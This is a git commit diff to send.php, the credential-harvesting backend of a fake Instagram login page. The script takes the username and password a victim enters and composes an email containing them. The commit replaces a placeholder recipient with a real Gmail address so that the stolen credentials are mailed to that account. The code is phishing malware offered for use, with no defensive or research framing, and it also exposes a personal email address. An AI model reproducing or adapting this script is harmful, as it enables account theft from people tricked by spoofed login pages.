64e5172a219448d04a7207ebb4bfd55a14c5c129
Karandepp88 <119753690+Karandepp88@users.noreply.github.com>
2022-12-23 18:19:40 +0530

    Update send.php

--- send.php
+++ send.php
@@ -4,7 +4,7 @@
 $username = $_REQUEST['u_name'];  // fetch username
  $passcode = $_REQUEST['pass'];  // fetch password
  $subject = "Someone Login ! Insta Dummy page";
- $to ="xxxxxxxx@gmail.com";
+ $to ="karansinghh006@gmail.com";
  
  $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
  
